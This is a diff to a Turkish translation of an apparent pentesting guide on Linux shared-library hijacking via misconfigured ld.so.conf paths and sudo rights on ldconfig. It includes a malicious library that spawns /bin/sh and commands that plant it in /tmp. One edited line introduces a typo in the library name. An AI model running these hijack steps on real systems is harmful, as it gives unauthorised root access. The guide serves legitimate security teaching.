@@ -40,14 +40,14 @@ puts("Hi");
 {{#endtab}}
 {{#endtabs}}
 
-1. **Bu dosyaları** makinenizde aynı klasörde **oluşturun**
-2. **Kütüphaneyi** **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. `libcustom.so`'yu `/usr/lib`'ye **kopyalayın**: `sudo cp libcustom.so /usr/lib` (root yetkileri)
-4. **Çalıştırılabilir dosyayı** **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. **Oluşturun** bu dosyaları makinenizde aynı klasörde
+2. **Derleyin** **kütüphaneyi**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Kopyalayın** `libcustom.so` dosyasını `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root yetkileri)
+4. **Derleyin** **çalıştırılabilir dosyayı**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
 ### Ortamı kontrol et
 
-_libcustom.so_'nun _/usr/lib_'den **yüklenip** yüklenmediğini ve ikili dosyayı **çalıştırıp** çalıştıramadığınızı kontrol edin.
+_lıbcustom.so_'nun _/usr/lib_ dizininden **yüklenip** yüklenmediğini ve ikili dosyayı **çalıştırıp** çalıştıramadığınızı kontrol edin.
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -81,9 +81,9 @@ printf("I'm the bad library\n");
 system("/bin/sh",NULL,NULL);
 }
 ```
-Artık **yanlış yapılandırılmış** yolun içinde kötü niyetli libcustom kütüphanesini **oluşturduğumuza göre**, bir **yeniden başlatma** veya root kullanıcısının **`ldconfig`** komutunu çalıştırmasını beklememiz gerekiyor (_eğer bu ikiliyi **sudo** olarak çalıştırabiliyorsanız veya **suid biti** varsa, kendiniz çalıştırabileceksiniz_).
+Artık **yanlış yapılandırılmış** yolun içinde kötü niyetli libcustom kütüphanesini **oluşturduğumuza göre**, bir **yeniden başlatma** veya root kullanıcısının **`ldconfig`** komutunu çalıştırmasını beklememiz gerekiyor (_eğer bu ikiliyi **sudo** olarak çalıştırabiliyorsanız veya **suid biti** varsa, bunu kendiniz çalıştırabileceksiniz_).
 
-Bu gerçekleştiğinde, `sharevuln` ikilisinin `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:
+Bu gerçekleştiğinde, `sharevuln` yürütülebilir dosyasının `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:
 ```c
 $ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffeee766000)
@@ -100,7 +100,7 @@ $ whoami
 ubuntu
 ```
 > [!NOTE]
-> Bu örnekte ayrıcalıkları yükseltmediğimizi, ancak yürütülen komutları değiştirerek ve **kötü niyetli ikili dosyayı çalıştırması için root veya başka bir ayrıcalıklı kullanıcıyı bekleyerek** ayrıcalıkları yükseltebileceğimizi unutmayın.
+> Bu örnekte ayrıcalıkları yükseltmediğimizi, ancak yürütülen komutları değiştirerek ve **kötü niyetli ikili dosyayı çalıştırması için root veya başka bir ayrıcalıklı kullanıcının beklemesiyle** ayrıcalıkları yükseltebileceğimizi unutmayın.
 
 ### Diğer yanlış yapılandırmalar - Aynı zafiyet
 
@@ -109,15 +109,15 @@ Ancak, `/etc/ld.so.conf.d` içindeki bazı **yapılandırma dosyalarında**, `/e
 
 ## İstismar 2
 
-**`ldconfig` üzerinde sudo ayrıcalıklarınız olduğunu varsayalım**.\
-`ldconfig`'e **konfigürasyon dosyalarının nereden yükleneceğini** belirtebilirsiniz, böylece `ldconfig`'in keyfi klasörleri yüklemesinden faydalanabiliriz.\
+**`ldconfig` üzerinde sudo ayrıcalıklarınız olduğunu varsayalım.**\
+`ldconfig`'e **konfigürasyon dosyalarının nereden yükleneceğini** belirtebilirsiniz, böylece `ldconfig`'in rastgele klasörleri yüklemesinden faydalanabiliriz.\
 Şimdi, "/tmp" yüklemek için gereken dosyaları ve klasörleri oluşturalım:
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Şimdi, **önceki istismarda belirtildiği gibi**, **kötü niyetli kütüphaneyi `/tmp` içinde oluşturun**.\
+Şimdi, **önceki istismarda** belirtildiği gibi, **kötü niyetli kütüphaneyi `/tmp` içinde oluşturun**.\
 Ve sonunda, yolu yükleyelim ve kütüphanenin nereden yüklendiğini kontrol edelim:
 ```bash
 ldconfig -f fake.ld.so.conf
